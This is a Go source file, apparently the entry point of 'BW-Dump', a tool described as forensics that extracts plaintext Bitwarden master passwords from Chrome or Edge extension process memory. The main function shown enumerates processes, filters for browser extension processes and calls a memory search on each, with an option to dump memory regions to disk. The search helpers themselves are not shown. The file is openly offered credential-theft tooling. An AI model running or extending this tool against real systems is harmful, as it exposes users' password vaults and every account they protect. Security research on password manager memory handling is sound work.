package main

import (
	"flag"
	"fmt"
	"log"

	"github.com/shirou/gopsutil/v3/process"
)

// The following may change in future versions of the Bitwarden extension
// Tested with the latest version Bitwarden 1.58 on MSEdge and Chrome

var dumpMemoryOption bool

func init() {
	flag.BoolVar(&dumpMemoryOption, "d", false, "dump memory regions to current directory")
	flag.Parse()
}

func main() {

	fmt.Print(`
 888 88b, Y8b Y8b Y888P    888 88e                                 
 888 88P'  Y8b Y8b Y8P     888 888b  8888 8888 888 888 8e  888 88e 
 888 8K     Y8b Y8b Y  888 888 8888D 8888 8888 888 888 88b 888 888b
 888 88b,    Y8b Y8b       888 888P  Y888 888P 888 888 888 888 888P
 888 88P'     Y8P Y        888 88"    "88 88"  888 888 888 888 88" 
                                                           888     
            Created by @NazMarkuta at Red Maple            888       
`)

	fmt.Printf("BW-Dump is a forensics tool that extracts plaintext Bitwarden Master Passwords from\nlocked vaults. It does this by reading browser extensions process memory by calling Windows\nAPI functions and searching for magic byte patterns.\n\n")
	fmt.Printf("Requirements:\n")
	fmt.Printf("  - Chromium browser (Chrome or MSEdge)\n")
	fmt.Printf("  - Bitwarden browser extension\n")
	fmt.Printf("  - Vault unlocked at least once\n\n")

	// Search through all (accessible) processes on the system
	procList, err := process.Processes()

	if err != nil {
		log.Fatalf("[!] Cannot retrieve list of processes: %s", err.Error())
	}

	// Filter for Browser and extension processes
	targetProcs, err := getFilteredProcs(procList)
	if err != nil {
		log.Fatalf("[!] No browser extension processes found!")
	}

	// Print all potential potential target PIDs. Note: this may
	// include other browser extension processes too. I haven't
	// found a way to target a specific extension yet.
	fmt.Printf("[+] Found Browser extension processes: %v\n\n", targetProcs)

	for i := range targetProcs {
		dumpStatus := searchProcessMemory(int(targetProcs[i]))

		if dumpStatus != nil {
			log.Fatalf("[!] Cannot dump memory of %d : %s", targetProcs[i], dumpStatus.Error())
		}
	}
}
